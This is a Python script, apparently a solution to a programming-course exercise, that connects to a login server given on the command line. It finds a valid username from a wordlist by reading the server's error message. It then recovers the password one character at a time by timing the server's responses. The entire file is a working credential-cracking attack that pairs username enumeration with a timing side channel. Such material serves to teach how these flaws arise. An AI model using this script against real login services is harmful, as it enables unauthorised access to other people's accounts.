# write your code here
import socket
import sys
import json
import datetime

args = sys.argv
host = args[1]
port = int(args[2])
address = (host, port)

flag = 0
cracked_password = ''
cracked_username = ''

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'


def gen_new_password(password):
    for let in letters:
        new_password = password + let
        yield new_password


delays = []

with socket.socket() as sock:
    sock.connect(address)
    with open("logins.txt", "r") as src:
        for line in src:
            d = str(line).strip("\n")
            data = {
                "login": d,
                "password": ""
            }
            login_details = json.dumps(data)
            sock.send(login_details.encode())
            resp = sock.recv(1024)
            response = json.loads(resp.decode())
            res = response["result"]
            if res == "Wrong password!":
                cracked_username = d
                break
        flag = 0
        temp = ''
        while True:
            x = gen_new_password(temp)
            for i in x:
                data = {
                    "login": cracked_username,
                    "password": i
                }
                login_details = json.dumps(data)
                start = datetime.datetime.now()
                sock.send(login_details.encode())
                resp = sock.recv(1024)
                finish = datetime.datetime.now()
                diff = finish - start
                diff = diff.microseconds
                response = json.loads(resp.decode())
                res = response["result"]
                if res == "Connection success!":
                    cracked_password = i
                    sock.close()
                    flag = 1
                    break
                if res == "Wrong password!" and diff > 100000:
                    temp = i
                    max_delay = diff
                    break
            if flag == 1:
                break
    sock.close()

data = {
    "login": cracked_username,
    "password": cracked_password
}

print(json.dumps(data))
